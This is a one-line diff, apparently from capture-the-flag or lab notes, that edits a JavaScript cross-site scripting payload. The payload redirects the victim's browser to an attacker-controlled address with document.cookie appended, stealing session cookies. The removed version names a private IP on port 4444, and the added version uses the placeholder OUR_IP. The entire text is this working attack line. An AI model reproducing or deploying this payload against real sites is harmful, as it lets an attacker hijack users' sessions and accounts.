@@ -1,1 +1,1 @@
-document.location='http://10.10.15.62:4444/?c='+document.cookie;
+document.location='http://OUR_IP/?c='+document.cookie;
